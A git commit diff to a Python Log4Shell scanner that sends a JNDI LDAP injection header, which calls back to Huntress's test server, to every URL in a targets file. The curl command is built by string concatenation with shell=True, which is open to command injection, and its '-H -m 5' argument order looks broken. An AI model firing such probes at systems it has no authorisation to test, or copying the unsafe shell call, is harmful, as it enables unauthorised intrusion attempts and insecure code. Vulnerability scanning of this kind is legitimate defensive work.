88f66b8a4e3b1aaddc3fdf7f4720fac1df2721f8
Robin Visser <robinvisser92@live.nl>
2021-12-13 16:44:26 +0100

    update

--- scan.py
+++ scan.py
@@ -1,4 +1,4 @@
-#!/path/to/python
+#!/usr/bin/env python
 import os
 import time
 import subprocess
@@ -7,14 +7,21 @@ targets_txt = "targets.txt"
 
 def scan():
     targets = []
-    with open(targets_txt, 'r', encoding='latin-1') as f:
-        targets.extend(f.readlines())
+    with open(targets_txt, 'r', encoding='utf8') as f:
+        targets.extend(f.read().splitlines())
 
+    # Checking Targets
     for target in targets:
         check_url = "${jndi:ldap://log4shell.huntress.com:1389/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}"
-        bashCommand = "curl " + f"{target} " + "-k -H " + f"'X-Api-Version: {check_url}'"
-        info = subprocess.run(bashCommand, capture_output=True, shell=True)
-        print(info)
+        bashCommand = "curl " + f"{target} " + "-k -H -m 5 " + f"'X-Api-Version: {check_url}'"
+        subprocess.Popen(bashCommand, shell=True)
+        print("trying " + target + " " + bashCommand)
+
+    # Result URL
+    result_guid = check_url.replace("${jndi:ldap://log4shell.huntress.com:1389/", "").replace("}","")
+    result_url = "https://log4shell.huntress.com/view/" + result_guid
+    time.sleep(10)
+    print("\npleasecheck: " + result_url )
 
 if __name__ == '__main__':
     scan()
